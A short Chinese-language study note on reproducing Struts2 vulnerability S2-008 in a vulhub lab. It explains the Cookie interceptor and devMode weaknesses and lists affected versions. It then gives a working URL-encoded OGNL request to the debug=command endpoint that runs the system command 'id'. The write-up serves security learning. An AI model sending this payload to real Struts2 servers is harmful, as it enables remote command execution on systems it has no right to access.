~~~~
title: 漏洞复现学习（s2-008）
tags: 
  - 渗透测试
  - 漏洞复现
  - struts2
categories: 
  - 渗透测试
  - 漏洞复现
  - struts2
~~~~



# Struts2漏洞S2-008复现

~~~~text
原理：S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。

影响版本：Struts 2.1.0 – 2.3.1
~~~~

## 漏洞搭建

~~~
https://github.com/vulhub/vulhub/tree/master/struts2/s2-008
~~~

## poc构建

例如`?debug=command&expression=<OGNL EXP>`在`devMode`mode中添加参数，OGNL表达式会直接执行，可以执行命令：

~~~~
devmode.action?debug=command&expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id
~~~~

![image-20220330214444897](E:\学习\picture\image-20220330214444897.png)
